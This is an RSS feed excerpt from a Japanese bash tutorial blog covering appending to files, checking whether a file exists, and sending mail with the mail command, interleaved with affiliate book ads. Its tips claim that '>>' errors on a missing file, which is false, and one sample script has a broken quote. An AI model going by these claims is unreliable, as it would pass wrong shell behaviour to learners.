CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【２５．ファイルに追加】ざっくりわかる「シェルスクリプト」</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-25-suzuki/</link><pubDate>Thu, 13 Jan 2022 11:26:13 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-25-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-25-suzuki/shellscript.jpg" alt="Featured image of post 【２５．ファイルに追加】ざっくりわかる「シェルスクリプト」" />&lt;h2 id="ファイルに追加">ファイルに追加&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>ファイルに追加：&lt;/b>&lt;/font>&lt;br>
bashで「&amp;raquo;」演算子を使用すると、既存のファイルに新しいデータを追加できます。&amp;lsquo;append_file.sh &amp;lsquo;という名前のファイルを作成し、次のコードを追加して、ファイルの最後に新しいコンテンツを追加します。ここで、「Learning Level 5」は、スクリプトの実行後に「book.txt」ファイルのに追加されます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-:book.txt" data-lang=":book.txt">1. Pro AngularJS
2. Learning JQuery
3. PHP Programming
4. Code Igniter
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash_append_file.sh" data-lang="bash_append_file.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;追加する前のファイル&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
cat book.txt&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;5. Bash Programming&amp;#34;&lt;/span> &amp;gt;&amp;gt; book.txt
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;追加した後のファイル&amp;#34;&lt;/span>
cat book.txt&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash append_file.sh
追加する前のファイル
1. Pro AngularJS
2. Learning JQuery
3. PHP Programming
4. Code Igniter
追加した後のファイル
1. Pro AngularJS
2. Learning JQuery
3. PHP Programming
4. Code Igniter
5. Bash Programming
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>「&amp;gt;」はファイルを新しく作成して追記します。&lt;/dd>
&lt;dd>「&amp;raquo;」は既に存在するファイルに追記します。ですので、ファイルが存在しないにもかかわらず、「&amp;raquo;」を行うと、ついするファイルがないため、エラーとなります。&lt;/dd>
&lt;dd>ファイルの存在を確認するための方法を次の章で説明します。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【２６．ファイルが存在するかどうかを確認】ざっくりわかる「シェルスクリプト」</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-26-suzuki/</link><pubDate>Thu, 13 Jan 2022 11:26:13 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-26-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-26-suzuki/shellscript.jpg" alt="Featured image of post 【２６．ファイルが存在するかどうかを確認】ざっくりわかる「シェルスクリプト」" />&lt;h2 id="ファイルが存在するかどうかを確認">ファイルが存在するかどうかを確認&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>ファイルが存在するかどうかをテストします。&lt;/b>&lt;/font>&lt;br>
&amp;lsquo;-e&amp;rsquo;または&amp;rsquo;-f&amp;rsquo;オプションを使用して、ファイルの存在を確認できます。次のコードの &amp;lsquo;if [ ]&amp;lsquo;では、ファイルの存在をテストするために「-f」オプションが使用されています。&amp;rsquo; file_exist.sh &amp;lsquo;という名前のファイルを作成し、次のコードを追加します。ここで、ファイル名はコマンドラインから渡されます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:file_exist.sh" data-lang="bash:file_exist.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">filename&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nv">$1&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -f &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$filename&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ファイルが存在します。&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ファイルは存在しません。&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ ls
book.txt level.txt
bash file_exist.sh level2.txt
ファイルは存在しません。
bash file_exist.sh level.txt
ファイルが存在します。
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>「&amp;raquo;」（アペンド）を行う場合の注意点は、必ずアペンドするファイルが存在している必要があるところです。&lt;/dd>
&lt;dd>ファイルが存在していればアペンド（追記）する。&lt;/dd>
&lt;dd>ファイルが存在しなければファイルを作成して追記する。&lt;/dd>
&lt;dd>といった処理が必要で、この処理を行わない場合、ファイルが存在しないにもかかわらず、値をファイルに追記しようとした際にエラーとなります。サンプルを以下に示します。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash_append_file2.sh" data-lang="bash_append_file2.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> -f level.txt &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="c1"># ファイルが存在するならば追記する&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Bash Programming&amp;#34;&lt;/span> &amp;gt;&amp;gt; level.txt&lt;span class="p">;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="c1"># ファイルが存在しないからlevel.txtを作成してから追記&lt;/span>
:&amp;gt; level.txt&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Bash Programming&amp;#34;&lt;/span> &amp;gt;&amp;gt; level.txt&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;追加した後のファイル&amp;#34;&lt;/span>
cat level.txt&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>touch コマンドと :&amp;gt; の違いを明確にしておく必要があります。&lt;/dd>
&lt;dd>「:&amp;gt;」 は、該当ファイルがなければ作成、あっても空のファイルに置き換えます。&lt;/dd>
&lt;dd>「touch」は、該当ファイルがなければ作成しますが、あれば何もしません。&lt;/dd>
&lt;dd>この違いを利用するとif文はとても簡潔に書き換えることができます。&lt;/dd>
&lt;dd>touchコマンドを使って上記ソースを書き換えてみます。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:bash_append_file3.sh" data-lang="bash:bash_append_file3.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
:&amp;gt; level.txt &lt;span class="c1"># 新規にファイルを作成&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Shell Scripting&amp;#34;&lt;/span> &amp;gt;&amp;gt; level.txt&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;1回目に追加したファイル&amp;#34;&lt;/span>
cat level.txt&lt;span class="p">;&lt;/span>
&lt;span class="c1"># 既にファイルが存在するので何もしない&lt;/span>
&lt;span class="c1"># 万が一、ファイルが存在しなければ作成。&lt;/span>
touch level.txt&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;Bash Programming&amp;#34;&lt;/span> &amp;gt;&amp;gt; level.txt&lt;span class="p">;&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;2回目に追加したファイル&amp;#34;&lt;/span>
cat level.txt&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash bash_append_file3.sh
1回目に追加したファイル
Shell Scripting
2回目に追加したファイル
Shell Scripting
Bash Programming
$
&lt;/code>&lt;/pre>&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>【２７．mailコマンド】ざっくりわかる「シェルスクリプト」</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-27-suzuki/</link><pubDate>Thu, 13 Jan 2022 11:26:13 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-27-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-27-suzuki/shellscript.jpg" alt="Featured image of post 【２７．mailコマンド】ざっくりわかる「シェルスクリプト」" />&lt;h2 id="mailコマンド">mailコマンド&lt;/h2>
&lt;p>&lt;font color=orange>&lt;b>メールを送る：&lt;/b>&lt;/font>&lt;br>
' mail &amp;lsquo;または ' sendmail &amp;lsquo;コマンドを使用して電子メールを送信できます。これらのコマンドを使用する前に、mailまたはsendmailに必要なパッケージをインストール・設定をする必要があります。&amp;rsquo; mail_example.sh &amp;lsquo;という名前のファイルを作成し、次のコードを追加して電子メールを送信します。&lt;/p>
&lt;h2 id="mailコマンドインストール">mailコマンドインストール&lt;/h2>
&lt;p>まずはここを参考に&lt;br>
&lt;a class="link" href="https://qiita.com/TanukiTam/items/abff82573c0f544b3b27" target="_blank" rel="noopener"
>Macでコマンドからメールを送る Gmail&lt;/a>&lt;/p>
&lt;p>linuxの場合は&lt;/p>
&lt;pre tabindex="0">&lt;code>$ yum install mailx
&lt;/code>&lt;/pre>&lt;h2 id="実際にメールを送ってみます">実際にメールを送ってみます。&lt;/h2>
&lt;pre tabindex="0">&lt;code>$ echo &amp;quot;本文&amp;quot; | mail -s &amp;quot;タイトル&amp;quot; -r from@example.com -c cc1@example.com -c cc2@example.com to1@example.com to2@example.com
&lt;/code>&lt;/pre>&lt;p>恐ろしいほどに簡単ですね。&lt;br>
おかしな事をかんがえるのはやめましょう。&lt;/p>
&lt;h2 id="シェルスクリプトでサンプルを作る">シェルスクリプトでサンプルを作る&lt;/h2>
&lt;p>&lt;a class="link" href="mailto:admin@sample.com" >admin@sample.com&lt;/a> の部分を自分のメールアドレスに置き換えて実行して下さい。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:mail_example.sh" data-lang="bash:mail_example.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nv">Recipient&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;admin@sample.com&amp;#34;&lt;/span>
&lt;span class="nv">Subject&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Greeting”
&lt;/span>&lt;span class="s2">Message=&amp;#34;&lt;/span>Welcome to our site&lt;span class="s2">&amp;#34;
&lt;/span>&lt;span class="s2">`mail -s &lt;/span>&lt;span class="nv">$Subject&lt;/span>&lt;span class="s2"> &lt;/span>&lt;span class="nv">$Recipient&lt;/span>&lt;span class="s2"> &amp;lt;&amp;lt;&amp;lt; &lt;/span>&lt;span class="nv">$Message&lt;/span>&lt;span class="s2">`
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>bashコマンドでファイルを実行します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash mail_example.sh
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>くれぐれもおかしな事をかんがえるのはやめましょう。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
